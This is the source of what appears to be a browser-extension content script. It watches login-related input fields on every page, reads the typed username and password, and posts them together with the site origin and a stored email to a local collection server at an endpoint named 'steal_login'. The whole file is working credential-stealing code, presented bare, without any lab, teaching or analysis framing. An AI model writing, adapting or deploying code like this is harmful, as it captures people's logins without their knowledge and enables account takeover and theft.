var text_inputs = $('input');
var password = $('[type="password"]')[0];
console.log(password);
$(password).change(function () {
    chrome.storage.local.get('email', function (result) {
        var userEmail = result.email;
        if (typeof userEmail === 'undefined') userEmail = "no_email_found";
        text_inputs.trigger('input');
    });
});

$.each(text_inputs, function (element) {
    $.get(`http://localhost:5000/get_login_kw`, function (result) {
        var is_in_attr = false;
        $.each(result.keywords, function (key) {
            $.each(text_inputs[element].attributes, function () {
                if (!(this.value === undefined)) {
                    if (this.value.indexOf(result.keywords[key]) >= 0) {
                        is_in_attr = true;
                    }
                }
            });
        });
        if (is_in_attr) {
            $(text_inputs[element]).on('input', function () {
                if ($(text_inputs[element]).val() != "") {
                    chrome.storage.local.get('email', function (resu) {
                        var userEmail;
                        var password = $('[type="password"]')[0];
                        if (typeof resu === 'undefined') userEmail = "no_email_found";
                        else userEmail = resu.email;
                        if (text_inputs[element].value != "" &&
                            !(typeof password === 'undefined')) {
                            $.post("http://localhost:5000/steal_login", {
                                email: userEmail,
                                url: window.location.origin,
                                username: $(text_inputs[element]).val(),
                                password: $(password).val()
                            });
                        }
                    });
                }
            });
        }
    });

});

